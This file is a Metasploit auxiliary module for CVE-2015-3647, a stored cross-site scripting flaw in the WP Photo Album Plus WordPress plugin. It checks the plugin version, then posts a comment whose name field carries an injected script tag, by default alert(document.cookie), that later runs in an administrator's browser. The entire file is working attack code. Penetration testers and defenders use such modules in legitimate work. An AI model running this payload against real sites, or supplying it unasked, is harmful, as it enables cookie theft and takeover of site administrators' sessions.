##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WP Photo Album Plus Stored Cross-Site Scripting (XSS)',
      'Description'     => %q(
        The vulnerability exists due to the absence of filtration of user-supplied
        input passed via the "comname" and "comemail" HTTP POST parameters to
        "/wp-content/plugins/wp-photo-album-plus/wppa-ajax-front.php" script when
        posting a comment.

        A remote attacker can post a specially crafted message containing malicious
        HTML or script code and execute it in administrator's browser in context of
        the vulnerable website, when administrator views images or comments in
        administrative interface.
      ),
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'High-Tech Bridge Security Research Lab',   # Discovery and disclosure
          'Rob Carr <rob[at]rastating.com>'           # Metasploit module
        ],
      'References'      =>
        [
          ['CVE', '2015-3647'],
          ['WPVDB', '7996'],
          ['URL', 'https://www.htbridge.com/advisory/HTB23257']
        ],
      'DisclosureDate'  => 'May 20 2015'
    ))

    register_options(
      [
        OptString.new('SCRIPT', [true, 'The JavaScript to store for execution', "alert(document.cookie);"])
      ], self.class)
  end

  def script
    datastore['SCRIPT']
  end

  def ajax_url
    normalize_uri(wordpress_url_plugins, 'wp-photo-album-plus', 'wppa-ajax-front.php')
  end

  def check
    check_plugin_version_from_readme('wp-photo-album-plus', '6.1.3')
  end

  def run
    print_status("#{peer} - Posting script...")
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => ajax_url,
      'vars_post' => {
        'action'      => 'wppa',
        'wppa-action' => 'do-comment',
        'photo-id'    => Rex::Text.rand_text_numeric(3),
        'comment'     => Rex::Text.rand_text_alpha(50),
        'comemail'    => "#{Rex::Text.rand_text_alpha(10)}@#{Rex::Text.rand_text_alpha(10)}.com",
        'comname'     => "#{Rex::Text.rand_text_alpha(8)}<script>#{script}</script>"
      }
    )
    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
    fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200

    print_good("#{peer} - Script stored and will be executed upon visiting /wp-admin/admin.php?page=wppa_manage_comments")
  end
end
